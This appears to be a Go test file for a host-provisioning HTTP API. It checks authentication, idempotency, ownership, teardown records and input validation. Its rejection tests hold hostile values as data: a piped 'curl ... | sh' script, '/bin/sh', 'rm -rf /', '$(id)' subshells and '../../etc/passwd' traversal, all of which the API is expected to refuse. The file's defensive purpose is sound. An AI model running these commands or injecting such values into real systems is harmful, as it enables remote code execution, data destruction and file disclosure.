package httpapi_test

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	httpapi "github.com/aviralmansingka/dotfiles/ops/provision/internal/adapters/http"
	"github.com/aviralmansingka/dotfiles/ops/provision/internal/domain"
	"github.com/aviralmansingka/dotfiles/ops/provision/internal/ports"
	"github.com/aviralmansingka/dotfiles/ops/provision/internal/testsupport/fakes"
)

// validCreateBody resolves against the offline catalog in testsupport/fakes.
const validCreateBody = `{"provider":"aws","name":"canary-01","profile":"rex","region":"ap-south-1","size":"standard"}`

// idemKey is a well-formed Idempotency-Key.
const idemKey = "idem-key-0001"

// apiUnderTest drives the real handler tree over an in-memory recorder: no
// listener, no network, no Temporal, no cloud.
type apiUnderTest struct {
	t      *testing.T
	handle http.Handler
	fakes  *fakes.Harness
}

func newAPI(t *testing.T) *apiUnderTest {
	t.Helper()
	harness := fakes.NewHarness(t)
	server, err := httpapi.New(harness.Service, harness.Logger)
	if err != nil {
		t.Fatalf("httpapi.New: %v", err)
	}
	return &apiUnderTest{t: t, handle: server.Handler(), fakes: harness}
}

// do issues one request. An empty header value means the header is absent.
func (a *apiUnderTest) do(method, path, authorization, idempotencyKey, body string) *httptest.ResponseRecorder {
	a.t.Helper()
	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	request := httptest.NewRequest(method, path, reader)
	if body != "" {
		request.Header.Set("Content-Type", "application/json")
	}
	if authorization != "" {
		request.Header.Set("Authorization", authorization)
	}
	if idempotencyKey != "" {
		request.Header.Set("Idempotency-Key", idempotencyKey)
	}
	recorder := httptest.NewRecorder()
	a.handle.ServeHTTP(recorder, request)
	return recorder
}

func (a *apiUnderTest) authorized(method, path, idempotencyKey, body string) *httptest.ResponseRecorder {
	a.t.Helper()
	return a.do(method, path, "Bearer "+fakes.TestToken, idempotencyKey, body)
}

func decodeObject(t *testing.T, recorder *httptest.ResponseRecorder) map[string]any {
	t.Helper()
	var payload map[string]any
	if err := json.Unmarshal(recorder.Body.Bytes(), &payload); err != nil {
		t.Fatalf("decode response %q: %v", recorder.Body.String(), err)
	}
	return payload
}

func errorCode(t *testing.T, recorder *httptest.ResponseRecorder) string {
	t.Helper()
	payload := decodeObject(t, recorder)
	envelope, ok := payload["error"].(map[string]any)
	if !ok {
		t.Fatalf("response has no error envelope: %s", recorder.Body.String())
	}
	code, _ := envelope["code"].(string)
	return code
}

// TestUnauthenticatedRequestsAreRejected covers acceptance criterion 1 through
// the transport: no token, an unknown token, a revoked token, and a malformed
// header are all 401 before any handler runs, on every route.
func TestUnauthenticatedRequestsAreRejected(t *testing.T) {
	t.Parallel()
	routes := []struct {
		method string
		path   string
	}{
		{http.MethodPost, "/v1/hosts"},
		{http.MethodGet, "/v1/hosts"},
		{http.MethodGet, "/v1/hosts/host-0001"},
		{http.MethodDelete, "/v1/hosts/host-0001"},
		{http.MethodGet, "/v1/jobs/create-host-0001"},
	}
	headers := []struct {
		label         string
		authorization string
	}{
		{"missing Authorization header", ""},
		{"unknown bearer token", "Bearer not-an-issued-token"},
		{"revoked bearer token", "Bearer " + fakes.RevokedToken},
		{"wrong scheme", "Basic " + fakes.TestToken},
		{"empty bearer token", "Bearer "},
		{"scheme without token", "Bearer"},
		{"token with inner whitespace", "Bearer " + fakes.TestToken + " extra"},
	}
	for _, route := range routes {
		for _, header := range headers {
			recorder := newAPI(t).do(route.method, route.path, header.authorization, idemKey, validCreateBody)
			if recorder.Code != http.StatusUnauthorized {
				t.Fatalf("%s %s with %s: status = %d, want 401 (body %s)",
					route.method, route.path, header.label, recorder.Code, recorder.Body.String())
			}
			if got := recorder.Header().Get("WWW-Authenticate"); !strings.HasPrefix(got, `Bearer realm=`) {
				t.Fatalf("%s %s: WWW-Authenticate = %q", route.method, route.path, got)
			}
			if code := errorCode(t, recorder); code != "unauthorized" {
				t.Fatalf("%s %s: error code = %q, want unauthorized", route.method, route.path, code)
			}
		}
	}

	// The same request with a valid token gets past authentication.
	api := newAPI(t)
	if recorder := api.authorized(http.MethodGet, "/v1/hosts", "", ""); recorder.Code != http.StatusOK {
		t.Fatalf("authenticated list: status = %d, want 200 (body %s)", recorder.Code, recorder.Body.String())
	}
}

// TestDuplicateCreateStartsExactlyOneJob covers acceptance criterion 2: the same
// Idempotency-Key with the same body returns the same host_id and job_id, leaves
// exactly one host row, one ledger reservation, and starts one workflow.
func TestDuplicateCreateStartsExactlyOneJob(t *testing.T) {
	t.Parallel()
	api := newAPI(t)

	first := api.authorized(http.MethodPost, "/v1/hosts", idemKey, validCreateBody)
	if first.Code != http.StatusAccepted {
		t.Fatalf("first create: status = %d, want 202 (body %s)", first.Code, first.Body.String())
	}
	firstBody := decodeObject(t, first)

	second := api.authorized(http.MethodPost, "/v1/hosts", idemKey, validCreateBody)
	if second.Code != http.StatusAccepted {
		t.Fatalf("replayed create: status = %d, want 202 (body %s)", second.Code, second.Body.String())
	}
	secondBody := decodeObject(t, second)

	if firstBody["host_id"] != secondBody["host_id"] || firstBody["job_id"] != secondBody["job_id"] {
		t.Fatalf("replay returned different identifiers: %v then %v", firstBody, secondBody)
	}
	hostID, _ := firstBody["host_id"].(string)
	jobID, _ := firstBody["job_id"].(string)
	if hostID == "" || jobID == "" {
		t.Fatalf("create response is missing identifiers: %s", first.Body.String())
	}
	if jobID != "create-"+hostID {
		t.Fatalf("job_id = %q, want create-%s", jobID, hostID)
	}

	ctx := context.Background()
	hosts, err := api.fakes.Store.ListHosts(ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if len(hosts) != 1 {
		t.Fatalf("host rows after a duplicate request = %d, want 1", len(hosts))
	}
	if hosts[0].ID != hostID || hosts[0].JobID != jobID {
		t.Fatalf("stored host = %s/%s, want %s/%s", hosts[0].ID, hosts[0].JobID, hostID, jobID)
	}
	if hosts[0].OwnerClientID != "test-client" {
		t.Fatalf("owner = %q, want test-client", hosts[0].OwnerClientID)
	}

	record, found, err := api.fakes.Store.Lookup(ctx, idemKey)
	if err != nil || !found {
		t.Fatalf("ledger lookup: found=%v err=%v", found, err)
	}
	if record.ResourceID != hostID || record.JobID != jobID {
		t.Fatalf("ledger record = %s/%s, want %s/%s", record.ResourceID, record.JobID, hostID, jobID)
	}

	if starts := api.fakes.Orchestrator.TotalStarts(); starts != 1 {
		t.Fatalf("workflows started = %d, want exactly 1", starts)
	}
	if count := api.fakes.Orchestrator.StartCount(jobID); count != 1 {
		t.Fatalf("job %s started %d times, want 1", jobID, count)
	}
}

// TestConflictingBodyUnderSameKeyIsRejected covers the required 409 case: a
// reused Idempotency-Key with a different body is a conflict, not a second job.
func TestConflictingBodyUnderSameKeyIsRejected(t *testing.T) {
	t.Parallel()
	api := newAPI(t)

	first := api.authorized(http.MethodPost, "/v1/hosts", idemKey, validCreateBody)
	if first.Code != http.StatusAccepted {
		t.Fatalf("first create: status = %d (body %s)", first.Code, first.Body.String())
	}
	firstBody := decodeObject(t, first)

	conflicting := strings.Replace(validCreateBody, "canary-01", "canary-02", 1)
	recorder := api.authorized(http.MethodPost, "/v1/hosts", idemKey, conflicting)
	if recorder.Code != http.StatusConflict {
		t.Fatalf("conflicting body: status = %d, want 409 (body %s)", recorder.Code, recorder.Body.String())
	}
	if code := errorCode(t, recorder); code != "idempotency_conflict" {
		t.Fatalf("error code = %q, want idempotency_conflict", code)
	}

	ctx := context.Background()
	hosts, err := api.fakes.Store.ListHosts(ctx)
	if err != nil {
		t.Fatalf("ListHosts: %v", err)
	}
	if len(hosts) != 1 {
		t.Fatalf("host rows after a conflicting request = %d, want 1", len(hosts))
	}
	if hosts[0].ID != firstBody["host_id"] {
		t.Fatalf("stored host changed: %s", hosts[0].ID)
	}
	if starts := api.fakes.Orchestrator.TotalStarts(); starts != 1 {
		t.Fatalf("workflows started = %d, want exactly 1", starts)
	}

	// A different key with the same body is a different request and is accepted.
	other := api.authorized(http.MethodPost, "/v1/hosts", "idem-key-0002", validCreateBody)
	if other.Code != http.StatusAccepted {
		t.Fatalf("new key: status = %d, want 202 (body %s)", other.Code, other.Body.String())
	}
	if otherBody := decodeObject(t, other); otherBody["host_id"] == firstBody["host_id"] {
		t.Fatal("a new Idempotency-Key must create a new host")
	}
}

// TestCreateRejectsUnknownJSONFields covers acceptance criterion 4 for
// client-supplied commands, flake URLs, state paths, Bao paths, and scripts: the
// create body has no field for them and the decoder refuses unknown fields.
func TestCreateRejectsUnknownJSONFields(t *testing.T) {
	t.Parallel()
	smuggled := []struct {
		field string
		value string
	}{
		{"flake_ref", ".#homeConfigurations.remote-mumbai.activationPackage"},
		{"flake_url", "github:attacker/repo#host"},
		{"flake", "path:./evil#host"},
		{"state_file", "/var/lib/fleet-provision/store.json"},
		{"terraform_state", "s3://bucket/terraform.tfstate"},
		{"bao_path", "secret/data/hosts/rex/canary"},
		{"secret_bundles", `["bao:secret/data/attacker"]`},
		{"script", "curl http://example.com | sh"},
		{"command", "/bin/sh"},
		{"executable", "/usr/bin/env"},
		{"instance_type", "p4d.24xlarge"},
		{"disk_gb", "4000"},
		{"tags", `{"fleet-owner":"attacker"}`},
		{"iam_role", "arn:aws:iam::123456789012:role/admin"},
		{"provider_credentials", `{"kind":"inline","secret":"x"}`},
	}
	for _, tc := range smuggled {
		body := strings.TrimSuffix(validCreateBody, "}") + `,"` + tc.field + `":` + quoteValue(tc.value) + `}`
		recorder := newAPI(t).authorized(http.MethodPost, "/v1/hosts", idemKey, body)
		if recorder.Code != http.StatusBadRequest {
			t.Fatalf("field %q: status = %d, want 400 (body %s)", tc.field, recorder.Code, recorder.Body.String())
		}
		payload := decodeObject(t, recorder)
		envelope, _ := payload["error"].(map[string]any)
		message, _ := envelope["message"].(string)
		if !strings.Contains(message, "unknown field") || !strings.Contains(message, tc.field) {
			t.Fatalf("field %q: message = %q, want it to name the unknown field", tc.field, message)
		}
	}
}

// quoteValue renders a JSON value for a test body: already-JSON values pass
// through, everything else is a JSON string.
func quoteValue(value string) string {
	if strings.HasPrefix(value, `"`) || strings.HasPrefix(value, "{") || strings.HasPrefix(value, "[") {
		return value
	}
	encoded, err := json.Marshal(value)
	if err != nil {
		panic(err)
	}
	return string(encoded)
}

// TestCreateRejectsArbitraryCommandsAndPaths covers acceptance criterion 4 for
// the accepted fields: identifiers, profile, region, and size are matched against
// allow-lists and the approved mapping, so commands, paths, and unknown
// provider/region/size/profile values are refused.
func TestCreateRejectsArbitraryCommandsAndPaths(t *testing.T) {
	t.Parallel()
	rejected := []struct {
		label string
		key   string
		body  string
	}{
		{"shell metacharacters in name", idemKey, `{"provider":"aws","name":"canary; rm -rf /","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"subshell in name", idemKey, `{"provider":"aws","name":"canary-$(id)","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"backticks in name", idemKey, `{"provider":"aws","name":"canary-` + "`id`" + `","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"newline in name", idemKey, `{"provider":"aws","name":"canary\nreboot","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"path as name", idemKey, `{"provider":"aws","name":"../../etc/passwd","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"pipe in region", idemKey, `{"provider":"aws","name":"canary-01","profile":"rex","region":"ap-south-1|tee /etc/passwd","size":"standard"}`},
		{"ampersand in size", idemKey, `{"provider":"aws","name":"canary-01","profile":"rex","region":"ap-south-1","size":"standard && reboot"}`},
		{"command as profile", idemKey, `{"provider":"aws","name":"canary-01","profile":"/bin/sh","region":"ap-south-1","size":"standard"}`},
		{"path as size", idemKey, `{"provider":"aws","name":"canary-01","profile":"rex","region":"ap-south-1","size":"../../etc/passwd"}`},
		{"unknown profile mapping", idemKey, `{"provider":"aws","name":"canary-01","profile":"ubuntu","region":"ap-south-1","size":"standard"}`},
		{"unknown region mapping", idemKey, `{"provider":"aws","name":"canary-01","profile":"rex","region":"us-east-1","size":"standard"}`},
		{"unknown size mapping", idemKey, `{"provider":"aws","name":"canary-01","profile":"rex","region":"ap-south-1","size":"xlarge"}`},
		{"unknown provider mapping", idemKey, `{"provider":"gcp","name":"canary-01","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"empty provider", idemKey, `{"name":"canary-01","profile":"rex","region":"ap-south-1","size":"standard"}`},
		{"shell metacharacters in Idempotency-Key", "idem; rm -rf /", validCreateBody},
		{"path in Idempotency-Key", "../../etc/passwd", validCreateBody},
		{"subshell in Idempotency-Key", "idem-$(id)-0001", validCreateBody},
	}
	for _, tc := range rejected {
		tc := tc
		t.Run(tc.label, func(t *testing.T) {
			t.Parallel()
			recorder := newAPI(t).authorized(http.MethodPost, "/v1/hosts", tc.key, tc.body)
			if recorder.Code != http.StatusBadRequest {
				t.Fatalf("%s: status = %d, want 400 (body %s)", tc.label, recorder.Code, recorder.Body.String())
			}
			if code := errorCode(t, recorder); code != ports.CodeInvalidRequest {
				t.Fatalf("%s: error code = %q, want %s", tc.label, code, ports.CodeInvalidRequest)
			}
		})
	}
}

// TestCreateRejectsMalformedDocuments covers the decoder edges that could
// otherwise smuggle a second object or a non-JSON body past validation.
func TestCreateRejectsMalformedDocuments(t *testing.T) {
	t.Parallel()
	bodies := []string{
		"",
		"not json",
		validCreateBody + ` {"provider":"aws"}`,
		`[]`,
		`{"provider":42,"name":"canary-01","profile":"rex","region":"ap-south-1","size":"standard"}`,
		strings.Repeat("x", 17<<10),
	}
	for _, body := range bodies {
		if len(body) > 200 {
			body = `{"provider":"aws","name":"` + body + `"}`
		}
		recorder := newAPI(t).authorized(http.MethodPost, "/v1/hosts", idemKey, body)
		if recorder.Code != http.StatusBadRequest {
			t.Fatalf("body %.40q: status = %d, want 400 (body %s)", body, recorder.Code, recorder.Body.String())
		}
	}
}

// TestCreateRequiresIdempotencyKey keeps the replay guarantee enforceable.
func TestCreateRequiresIdempotencyKey(t *testing.T) {
	t.Parallel()
	recorder := newAPI(t).authorized(http.MethodPost, "/v1/hosts", "", validCreateBody)
	if recorder.Code != http.StatusBadRequest {
		t.Fatalf("missing Idempotency-Key: status = %d, want 400 (body %s)", recorder.Code, recorder.Body.String())
	}
}

// TestOwnershipIsEnforced makes sure one client cannot read another client's
// host or job; a cross-client read is reported as not found, not forbidden.
func TestOwnershipIsEnforced(t *testing.T) {
	t.Parallel()
	api := newAPI(t)
	created := api.authorized(http.MethodPost, "/v1/hosts", idemKey, validCreateBody)
	if created.Code != http.StatusAccepted {
		t.Fatalf("create: status = %d (body %s)", created.Code, created.Body.String())
	}
	body := decodeObject(t, created)
	hostID, _ := body["host_id"].(string)
	jobID, _ := body["job_id"].(string)

	owner := api.do(http.MethodGet, "/v1/hosts/"+hostID, "Bearer "+fakes.TestToken, "", "")
	if owner.Code != http.StatusOK {
		t.Fatalf("owner read: status = %d (body %s)", owner.Code, owner.Body.String())
	}
	other := api.do(http.MethodGet, "/v1/hosts/"+hostID, "Bearer "+fakes.OtherToken, "", "")
	if other.Code != http.StatusNotFound {
		t.Fatalf("cross-client host read: status = %d, want 404", other.Code)
	}
	otherJob := api.do(http.MethodGet, "/v1/jobs/"+jobID, "Bearer "+fakes.OtherToken, "", "")
	if otherJob.Code != http.StatusNotFound {
		t.Fatalf("cross-client job read: status = %d, want 404", otherJob.Code)
	}
}

// TestTombstonedHostIsVisibleWithItsIdentifiersAndCleanupOutcomes is the operator
// surface a teardown check depends on: after a delete, GET /v1/hosts/{id} names the
// provider instance, the tailnet device, the tombstone, and the steps that did not
// finish. Without those fields an operator has nothing to check against AWS,
// Tailscale, or Bao.
func TestTombstonedHostIsVisibleWithItsIdentifiersAndCleanupOutcomes(t *testing.T) {
	t.Parallel()
	api := newAPI(t)
	ctx := context.Background()

	created := api.authorized(http.MethodPost, "/v1/hosts", idemKey, validCreateBody)
	if created.Code != http.StatusAccepted {
		t.Fatalf("create status = %d, want 202", created.Code)
	}
	hostID, _ := decodeObject(t, created)["host_id"].(string)
	if hostID == "" {
		t.Fatalf("create response carried no host id: %s", created.Body.String())
	}

	// The device step fails: the record must say so, and the rest must still have run.
	if _, err := api.fakes.Store.UpdateHost(ctx, hostID, func(h *domain.Host) error {
		h.MarkResource("i-0123456789abcdef0", "10.99.1.10", api.fakes.Clock.Now())
		h.MarkDevice("n1234CNTRL", api.fakes.Clock.Now())
		h.MarkCleanupIncomplete([]domain.CleanupStep{domain.CleanupRemoveDevice}, api.fakes.Clock.Now())
		return nil
	}); err != nil {
		t.Fatalf("record a partial teardown: %v", err)
	}

	partial := api.authorized(http.MethodGet, "/v1/hosts/"+hostID, "", "")
	if partial.Code != http.StatusOK {
		t.Fatalf("get status = %d, want 200", partial.Code)
	}
	payload := decodeObject(t, partial)
	if payload["resource_id"] != "i-0123456789abcdef0" {
		t.Fatalf("resource_id = %v, want the instance id", payload["resource_id"])
	}
	if payload["device_id"] != "n1234CNTRL" {
		t.Fatalf("device_id = %v, want the device id", payload["device_id"])
	}
	if payload["tombstone"] != nil {
		t.Fatalf("a partially torn-down host reported a tombstone: %v", payload["tombstone"])
	}
	pending, _ := payload["pending_cleanup"].([]any)
	if len(pending) != 1 || pending[0] != string(domain.CleanupRemoveDevice) {
		t.Fatalf("pending_cleanup = %v, want the device step", payload["pending_cleanup"])
	}

	// A completed teardown replaces that with a tombstone and drops the address.
	if _, err := api.fakes.Store.UpdateHost(ctx, hostID, func(h *domain.Host) error {
		return h.CompleteTeardown(domain.NewTombstone(
			api.fakes.Clock.Now(), domain.CleanupSteps, nil, 2))
	}); err != nil {
		t.Fatalf("tombstone the host: %v", err)
	}
	done := decodeObject(t, api.authorized(http.MethodGet, "/v1/hosts/"+hostID, "", ""))
	if done["state"] != string(domain.HostStateDeleted) {
		t.Fatalf("state = %v, want deleted", done["state"])
	}
	if done["pending_cleanup"] != nil {
		t.Fatalf("pending_cleanup = %v on a completed teardown, want absent", done["pending_cleanup"])
	}
	if done["private_address"] != "" {
		t.Fatalf("private_address = %v on a tombstoned host, want it cleared", done["private_address"])
	}
	tombstone, ok := done["tombstone"].(map[string]any)
	if !ok {
		t.Fatalf("a completed teardown reported no tombstone: %s", partial.Body.String())
	}
	if tombstone["policy"] != domain.TombstonePolicy {
		t.Fatalf("tombstone policy = %v, want the sanitization rule", tombstone["policy"])
	}
	if revoked, _ := tombstone["token_accessors_revoked"].(float64); revoked != 2 {
		t.Fatalf("token_accessors_revoked = %v, want 2", tombstone["token_accessors_revoked"])
	}
	released, _ := tombstone["released"].([]any)
	if len(released) != len(domain.CleanupSteps) {
		t.Fatalf("released = %v, want every step", tombstone["released"])
	}

	// A repeat delete is a read: 202 with the same job, no new operation.
	before := api.fakes.Orchestrator.TotalStarts()
	repeat := api.authorized(http.MethodDelete, "/v1/hosts/"+hostID, "", "")
	if repeat.Code != http.StatusAccepted {
		t.Fatalf("repeat delete status = %d, want 202: %s", repeat.Code, repeat.Body.String())
	}
	if after := api.fakes.Orchestrator.TotalStarts(); after != before {
		t.Fatalf("a repeat delete against a tombstoned host started %d operation(s), want none", after-before)
	}
}

// TestHealthIsUnauthenticatedAndUnknownRoutesStillFail covers the liveness probe:
// GET /healthz answers 200 without a token, and the catch-all still answers 404
// so the probe cannot be mistaken for a hole in the route table.
func TestHealthIsUnauthenticatedAndUnknownRoutesStillFail(t *testing.T) {
	api := newAPI(t)

	recorder := api.do(http.MethodGet, "/healthz", "", "", "")
	if recorder.Code != http.StatusOK {
		t.Fatalf("GET /healthz without a token: got %d, want 200 (%s)", recorder.Code, recorder.Body.String())
	}
	if body := decodeObject(t, recorder); body["status"] != "ok" {
		t.Fatalf("GET /healthz body: got %q, want {\"status\":\"ok\"}", recorder.Body.String())
	}

	// The catch-all still answers 404 for a real client, so the probe route is not
	// a hole in the table: unknown paths keep going through the auth gate first
	// (401 without a token) and only then reach handleNotFound.
	unknownAnon := api.do(http.MethodGet, "/v1/nope", "", "", "")
	if unknownAnon.Code != http.StatusUnauthorized {
		t.Fatalf("GET /v1/nope without a token: got %d, want 401", unknownAnon.Code)
	}
	unknown := api.authorized(http.MethodGet, "/v1/nope", "", "")
	if unknown.Code != http.StatusNotFound {
		t.Fatalf("GET /v1/nope with a token: got %d, want 404", unknown.Code)
	}
}
